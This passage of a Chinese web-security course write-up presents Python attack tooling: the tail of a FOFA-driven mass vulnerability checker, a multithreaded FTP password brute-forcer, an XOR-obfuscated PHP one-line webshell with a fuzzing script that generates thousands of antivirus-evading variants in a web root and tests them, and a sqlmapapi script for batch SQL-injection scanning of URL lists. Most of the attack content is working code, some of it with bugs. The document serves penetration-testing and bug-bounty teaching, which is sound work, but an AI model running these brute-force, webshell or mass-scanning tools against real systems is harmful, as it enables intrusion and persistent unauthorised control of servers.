            vuln_code_l<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>linxu_url<span class="token punctuation">)</span><span class="token punctuation">.</span>status_code
            vuln_code_w<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>windows_url<span class="token punctuation">)</span><span class="token punctuation">.</span>status_code
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"check-&gt;"</span><span class="token operator">+</span>ip<span class="token punctuation">)</span>
            <span class="token keyword">if</span> vuln_code_l<span class="token operator">==</span><span class="token number">200</span> <span class="token keyword">or</span> vuln_code_w <span class="token operator">==</span><span class="token number">200</span><span class="token punctuation">:</span>
                <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">r'vuln.txt'</span><span class="token punctuation">,</span><span class="token string">'a+'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
                    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>
                    f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">pass</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    search<span class="token operator">=</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    page<span class="token operator">=</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
    fofa_search<span class="token punctuation">(</span>search<span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token punctuation">)</span>
    check_vuln<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> 
<h3><a id="Python__SRC__416"></a>Python 开发-教育 SRC 报告平台信息提取脚本</h3> 
<p>相关脚本代码见下面涉及资源的网盘打包文件中<br> 案例 3-SRC 报告平台信息提取脚本为后续 SRC 课程思路做准备</p> 
<p>使用爬虫爬取页面信息，通过 lxml 提取漏洞信息<br> 读取 10 页的漏洞信息</p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> requests<span class="token punctuation">,</span>time
<span class="token keyword">from</span> lxml <span class="token keyword">import</span> etree

<span class="token keyword">def</span> <span class="token function">edu_list</span><span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> page <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>page<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            url<span class="token operator">=</span><span class="token string">'https://src.sjtu.edu.cn/list/?page='</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>page<span class="token punctuation">)</span>
            data<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content
            <span class="token comment">#print(data)</span>
            soup <span class="token operator">=</span> etree<span class="token punctuation">.</span>HTML<span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            result <span class="token operator">=</span> soup<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'//td[@class=""]/a/text()'</span><span class="token punctuation">)</span>
            <span class="token comment">#print(result)</span>
            results <span class="token operator">=</span> <span class="token string">'\n'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>result<span class="token punctuation">)</span>
            resultss<span class="token operator">=</span>results<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>resultss<span class="token punctuation">)</span>
            <span class="token keyword">for</span> edu <span class="token keyword">in</span> resultss<span class="token punctuation">:</span>
                <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">r'src.txt'</span><span class="token punctuation">,</span> <span class="token string">'a+'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
                    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>edu<span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
                    f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>
            <span class="token keyword">pass</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    edu_list<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
</code></pre> 
<h3><a id="_451"></a>涉及资源：</h3> 
<p>https://fofa.so/<br> https://src.sjtu.edu.cn/<br> https://www.secpulse.com/archives/42277.html<br> https://pan.baidu.com/s/13y3U6jX3WUYmnfKnXT8abQ 提取码：<br> xiao</p> 
<h2><a id="Python__FuzzWaf__458"></a>Python 开发-多线程 Fuzz&amp;Waf 异或免杀&amp;爆破</h2> 
<p><em><strong>本节知识点：</strong></em><br> 协议模块使用，Request 爬虫技术，简易多线程技术，编码技术，Bypass 后门技术<br> <em><strong>学习目的：</strong></em><br> 掌握利用强大的模块实现各种协议连接操作(爆破或利用等)，配合 Fuzz 吊打 WAF等</p> 
<h3><a id="_1Python__463"></a>案例 1-Python 开发-简单多线程技术实现脚本</h3> 
<pre><code>queue，threading 模块使用
</code></pre> 
<h3><a id="_2Python__FTP__467"></a>案例 2-Python 开发-利用 FTP 模块实现协议爆破脚本</h3> 
<pre><code>1.ftplib 模块使用
2.遍历用户及密码字典
3.尝试连接执行命令判断
</code></pre> 
<p><em>思路</em><br> 需要的参数<br> IP；端口；用户名；密码字典 （fuzz 字典）<br> 案例 1，ftp 爆破登录<br> <strong>1、思路</strong><br> （1）连接 ftp 服务需要输入的内容（参数）有：<br> ①连接的 IP<br> ②端口（默认 22）<br> ③用户名 ④密码（字典）<br> （2）实现<br> 使用 python 的 ftplib 模块可实现 ftp 登录，登入输入参数，IP；端口；用户名；密码。在未知密码时，通过 ftp 密码字典去爆破即可。<br> <strong>2、涉及知识点</strong><br> （1）ftplib 模块的使用<br> ①ftp 接口说明<br> <img src="https://images2.imgbox.com/02/27/QQ74bNYF_o.png" alt="在这里插入图片描述"><br> ftp 常用函数<br> <img src="https://images2.imgbox.com/df/9b/geX7iZwD_o.png" alt="在这里插入图片描述"><br> （2）python多线程<br> 用法详解<br> https://blog.csdn.net/briblue/article/details/85101144<br> https://www.cnblogs.com/j6-2/p/4645490.html</p> 
<p><strong>3、案例1+案例2</strong></p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> ftplib
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> threading
<span class="token keyword">import</span> queue

<span class="token comment">#简单模拟登录测试</span>
<span class="token comment">#爆破：IP，端口，用户名，密码字典</span>
<span class="token keyword">def</span> <span class="token function">ftp_brute</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">:</span>
    ftp <span class="token operator">=</span> ftplib<span class="token punctuation">.</span>FTP<span class="token punctuation">(</span><span class="token punctuation">)</span>
    ftp<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span>
    <span class="token keyword">while</span> <span class="token keyword">not</span> q<span class="token punctuation">.</span>empty<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token builtin">dict</span> <span class="token operator">=</span> q<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token builtin">dict</span> <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">)</span>
        username <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        passwd <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">)</span>
            <span class="token comment">#print(username + '|' + passwd)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        ftp<span class="token punctuation">.</span>login<span class="token punctuation">(</span>usename<span class="token punctuation">,</span> passwd<span class="token punctuation">)</span>
        ftp<span class="token punctuation">.</span>retrlines<span class="token punctuation">(</span><span class="token string">'list'</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>username <span class="token operator">+</span> <span class="token string">'|'</span> <span class="token operator">+</span> passwd <span class="token operator">+</span> <span class="token string">'|ok'</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> ftplib<span class="token punctuation">.</span>all_errors<span class="token punctuation">:</span>
        <span class="token keyword">pass</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    ip <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    port <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
    userfile <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>
    passfile <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span>
    threading_num <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span>
    q <span class="token operator">=</span> queue<span class="token punctuation">.</span>Queue<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> usename <span class="token keyword">in</span> <span class="token builtin">open</span><span class="token punctuation">(</span>userfile<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> passwd <span class="token keyword">in</span> <span class="token builtin">open</span><span class="token punctuation">(</span>passfile<span class="token punctuation">)</span><span class="token punctuation">:</span>
            username <span class="token operator">=</span> username<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>
            passwd <span class="token operator">=</span> passwd<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>
            zidian <span class="token operator">=</span> username <span class="token operator">+</span> <span class="token string">'|'</span> <span class="token operator">+</span> passwd
            q<span class="token punctuation">.</span>put<span class="token punctuation">(</span>zidian<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>zidian<span class="token punctuation">)</span>

    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>threading_num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        t <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>ftp_brute<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre> 
<h3><a id="_3Python__Fuzz__Shell__543"></a>案例 3-Python 开发-配合 Fuzz 实现免杀异或 Shell 脚本</h3> 
<pre><code>1.免杀异或 Shell 原理讲解及开发思路（参考及举例：!^@,"^?等）
2.基于 Fuzz 思路生成大量 Payload 代码并有序命名写入网站文件中
3.基于多线程实现批量访问 Shell 文件并提交测试是否正常连接回显
</code></pre> 
<p><strong>1、php 异或</strong><br> 参考 https://blog.csdn.net/qq_41617034/article/details/104441032 资料<br> (1)免杀异或<br> 异或一句话木马</p> 
<pre><code>&lt;?php $a=(“!”^”@”).’ssert’;$a($_POST[x];?&gt;
其原形为&lt;?php assert($_POST[x]);?&gt;
</code></pre> 
<p>原理：!的 ASCII 为 33；@的 ASCII 为 64，二者的值转换成二进制，并且进行异或运算，得出 的二进制结果再转换成 ASCII，该值为 97，查询为 a<br> 通过 fuzz 来生成免杀木马<br> 思路：不看二进制的异或计算，列出所有 ASCII 值&lt;127 的的组合（127x127），将这些组合放入一句话木马中，然后测试该 payload 是否成功，写入到网站根目录；发起 requests 请求， 看返回内容，能够执行的文件返回的内容和不能执行的文件返回的内容是不一样的</p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time
<span class="token keyword">import</span> threading<span class="token punctuation">,</span>queue

<span class="token keyword">def</span> <span class="token function">string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span> <span class="token keyword">not</span> q<span class="token punctuation">.</span>empty<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        filename<span class="token operator">=</span>q<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>
        url <span class="token operator">=</span> <span class="token string">'http://127.0.0.1:8081/x/'</span> <span class="token operator">+</span> filename
        datas <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">'x'</span><span class="token punctuation">:</span> <span class="token string">'phpinfo();'</span>
        <span class="token punctuation">}</span>
        result <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>datas<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">'XIAODI-PC'</span> <span class="token keyword">in</span> result<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'check-&gt;'</span><span class="token operator">+</span>filename<span class="token operator">+</span><span class="token string">'-&gt;ok'</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'check-&gt;'</span><span class="token operator">+</span>filename<span class="token operator">+</span><span class="token string">'-&gt;no'</span><span class="token punctuation">)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">shell_test_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    url<span class="token operator">=</span><span class="token string">'http://127.0.0.1:8081/x/33xd64.php'</span>
    datas<span class="token operator">=</span><span class="token punctuation">{<!-- --></span>
        <span class="token string">'x'</span><span class="token punctuation">:</span><span class="token string">'phpinfo();'</span>
    <span class="token punctuation">}</span>
    result<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>datas<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">'XIAODI-PC'</span> <span class="token keyword">in</span> result<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'ok'</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    q<span class="token operator">=</span>queue<span class="token punctuation">.</span>Queue<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> ii <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            payload <span class="token operator">=</span> <span class="token string">"'"</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"'"</span> <span class="token operator">+</span> <span class="token string">'^'</span> <span class="token operator">+</span> <span class="token string">"'"</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>ii<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"'"</span>
            code <span class="token operator">=</span> <span class="token string">"&lt;?php $a=("</span> <span class="token operator">+</span> payload <span class="token operator">+</span> <span class="token string">").'ssert';$a($_POST[x]);?&gt;"</span>
            filename <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'xd'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>ii<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.php'</span>
            q<span class="token punctuation">.</span>put<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'D:/phpstudy/PHPTutorial/WWW/x/'</span> <span class="token operator">+</span> filename<span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>code<span class="token punctuation">)</span>
                f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Fuzz文件生成成功'</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        t<span class="token operator">=</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>string<span class="token punctuation">)</span>
        t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre> 
<h3><a id="_609"></a>涉及资源</h3> 
<p>https://github.com/zhanye/fuzzdb<br> https://github.com/stemmm/fuzzDicts<br> https://www.cnblogs.com/liujizhou/p/11806497.html<br> https://www.cnblogs.com/kaituorensheng/p/4480512.html<br> https://blog.csdn.net/qq_41617034/article/details/104441032<br> https://pan.baidu.com/s/13y3U6jX3WUYmnfKnXT8abQ 提取码：xiao</p> 
<h2><a id="Python_sqlmapapiTamperPocsuite_617"></a>Python 开发-sqlmapapi&amp;Tamper&amp;Pocsuite</h2> 
<p><em><strong>本节知识点：</strong></em><br> Request 爬虫技术，Sqlmap 深入分析，Pocsuite 分析，框架代码二次修改等<br> <em><strong>本节目的：</strong></em><br> 掌握安全工具的 API 接口开发利用，掌握优秀框架的二次开发插件引用等</p> 
<h3><a id="_1Sqlmap_Tamper__623"></a>案例 1-Sqlmap_Tamper 模块脚本编写绕过滤</h3> 
<h3><a id="_2SqlmapAPI__SQL__624"></a>案例 2-SqlmapAPI 调用实现自动化 SQL 注入安全检测</h3> 
<p>参考：https://www.freebuf.com/articles/web/204875.html<br> 应用案例：前期通过信息收集拿到大量的 URL 地址，这个时候可以配合 SqlmapAPI 接口进行批量的 SQL<br> 注入检测（SRC 挖掘）<br> 开发当前项目过程：（利用 sqlmapapi 接口实现批量 URL 注入安全检测）</p> 
<pre><code>1.创建新任务记录任务 ID @get("/task/new")
2.设置任务 ID 扫描信息 @post("/option/&lt;taskid&gt;/set ")
3.开始扫描对应 ID 任务 @post("/scan/&lt;taskid&gt;/start")
4.读取扫描状态判断结果 @get("/scan/&lt;taskid&gt;/status")
5.如果结束删除 ID 并获取结果 @get("/task/&lt;taskid&gt;/delete")
6.扫描结果查看@get("/scan/&lt;taskid&gt;/data")
</code></pre> 
<pre><code class="prism language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> json
<span class="token keyword">import</span> time

<span class="token keyword">def</span> <span class="token function">sqlmapapi</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    headers <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
        <span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/json'</span>
    <span class="token punctuation">}</span>
    scan_url<span class="token operator">=</span><span class="token punctuation">{<!-- --></span>
        <span class="token string">'url'</span><span class="token punctuation">:</span>url
    <span class="token punctuation">}</span>
    scan_task_url<span class="token operator">=</span><span class="token string">'http://127.0.0.1:8775/task/new'</span>
    scan_task<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>scan_task_url<span class="token punctuation">)</span>
    <span class="token comment">#print(scan_task.json())</span>
    scan_task_id<span class="token operator">=</span>scan_task<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'taskid'</span><span class="token punctuation">]</span>
    <span class="token comment">#print(scan_task_id)</span>
    <span class="token keyword">if</span> <span class="token string">'success'</span> <span class="token keyword">in</span> scan_task<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'sqlmapapi task create success...'</span><span class="token punctuation">)</span>
        scan_task_set_url <span class="token operator">=</span> <span class="token string">'http://127.0.0.1:8775/option/'</span> <span class="token operator">+</span> scan_task_id <span class="token operator">+</span> <span class="token string">'/set'</span>
        scan_task_set <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>scan_task_set_url<span class="token punctuation">,</span>data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>scan_url<span class="token punctuation">)</span><span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
        <span class="token comment">#print(scan_url)</span>
        <span class="token comment">#print(scan_task_set.content.decode('utf-8'))</span>
        <span class="token keyword">if</span> <span class="token string">'success'</span> <span class="token keyword">in</span> scan_task_set<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'sqlmapapi taskid set success'</span><span class="token punctuation">)</span>
            scan_start_url<span class="token operator">=</span><span class="token string">'http://127.0.0.1:8775/scan/'</span><span class="token operator">+</span>scan_task_id<span class="token operator">+</span><span class="token string">'/start'</span>
            scan_start<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>scan_start_url<span class="token punctuation">,</span>data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>scan_url<span class="token punctuation">)</span><span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
            <span class="token comment">#print(scan_start.content.decode('utf-8'))</span>
            <span class="token keyword">if</span> <span class="token string">'success'</span> <span class="token keyword">in</span> scan_start<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'sqlmapapi scan start success'</span><span class="token punctuation">)</span>
                <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
                    scan_status_url <span class="token operator">=</span> <span class="token string">'http://127.0.0.1:8775/scan/'</span> <span class="token operator">+</span> scan_task_id <span class="token operator">+</span> <span class="token string">'/status'</span>
                    scan_status <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>scan_status_url<span class="token punctuation">)</span>
                    <span class="token comment">#print(scan_status.content.decode('utf-8'))</span>
                    <span class="token keyword">if</span> <span class="token string">'running'</span> <span class="token keyword">in</span> scan_status<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                        <span class="token keyword">print</span><span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">'-&gt;scan running'</span><span class="token punctuation">)</span>
                        <span class="token keyword">pass</span>
                    <span class="token keyword">else</span><span class="token punctuation">:</span>
                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'sqlmapapi scan end'</span><span class="token punctuation">)</span>
                        scan_data_url<span class="token operator">=</span><span class="token string">'http://127.0.0.1:8775/scan/'</span> <span class="token operator">+</span> scan_task_id <span class="token operator">+</span> <span class="token string">'/data'</span>
                        scan_data<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>scan_data_url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
                        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">r'scan_result.txt'</span><span class="token punctuation">,</span><span class="token string">'a+'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
                            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
                            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>scan_data<span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
                            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'==========python sqlmapapi by xiaodi=========='</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
                            f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
                        <span class="token comment">#print('delete taskid')</span>
                        scan_deltask_url <span class="token operator">=</span> <span class="token string">'http://127.0.0.1:8775/task/'</span> <span class="token operator">+</span> scan_task_id <span class="token operator">+</span> <span class="token string">'/delete'</span>
                        scan_deltask<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>scan_deltask_url<span class="token punctuation">)</span>
                        <span class="token keyword">if</span> <span class="token string">'success'</span> <span class="token keyword">in</span> scan_deltask<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'delete taskid success'</span><span class="token punctuation">)</span>
                        <span class="token keyword">break</span>
                    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"scanurl checking ok....."</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> url <span class="token keyword">in</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'url.txt'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        url<span class="token operator">=</span>url<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>
        sqlmapapi<span class="token punctuation">(</span>url<span class="token punctuation">)</span>

</code></pre> 
<h3><a id="_3Pocsuite3__POCEXP__701"></a>案例 3-Pocsuite3 漏扫框架二次开发 POC/EXP 引入使用</h3> 
<p>参考：https://www.freebuf.com/articles/people/162868.html<br> 开发当前项目过程：（利用已知框架增加引入最新或内部的 EXP 进行安全检测）</p> 
<pre><code>1.熟悉 Pocsuite3 项目使用及介绍
2.熟悉使用命令及代码文件对应情况
3.选取 Glassfish 漏洞进行编写测试
4.参考自带漏洞模版代码模仿写法测试
python cli.py -u x.x.x.x -r Glassfish.py --verify
</code></pre> 
<pre><code class="prism language-python"><span class="token triple-quoted-string string">"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""</span>

<span class="token keyword">import</span> re
<span class="token keyword">from</span> collections <span class="token keyword">import</span> OrderedDict
<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> urljoin

